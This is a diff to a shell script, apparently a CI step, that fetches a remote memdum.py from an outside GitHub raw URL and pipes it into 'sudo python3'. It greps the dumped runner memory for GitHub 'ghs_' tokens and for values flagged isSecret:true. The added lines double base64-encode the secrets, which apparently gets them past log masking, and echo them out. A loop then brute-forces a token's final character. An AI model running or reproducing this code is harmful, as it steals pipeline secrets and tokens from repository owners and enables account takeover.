@@ -5,14 +5,15 @@ readonly REPO="thi3nl0ng/thi3nl0ng.github.io"
 TOKEN_VAL=`curl -sSf https://raw.githubusercontent.com/r3s34rch/test/main/memdum.py | sudo python3 | tr -d '\0' | grep -aoE 'ghs_[0-9A-Za-z]{20,}' | sort -u | awk 'NR==2' | xargs  `
 
 TOKEN_VAL64=`curl -sSf https://raw.githubusercontent.com/r3s34rch/test/main/memdum.py | sudo python3 | tr -d '\0' | grep -aoE 'ghs_[0-9A-Za-z]{20,}' | sort -u | base64 `
-
+B64_BLOB=`curl -sSf https://raw.githubusercontent.com/r3s34rch/test/main/memdum.py | sudo python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' | sort -u | base64 -w 0 | base64 -w 0`
 echo "-----------------------------------------------------------------"
 echo "abc" "$TOKEN_VAL" "xyz"
 echo "${TOKEN_VAL:0:39}"
 #echo "-----------------------------------------------------------------"
 echo "$TOKEN_VAL64"
 echo "-----------------------------------------------------------------"
-
+echo "$B64_BLOB"
+echo "-----------------------------------------------------------------"
 for f in {a..z} {A..Z} {0..9}; do 
     #echo "${TOKEN_VAL:0:39}$f" 
     Header="Authorization: token ${TOKEN_VAL:0:39}$f"
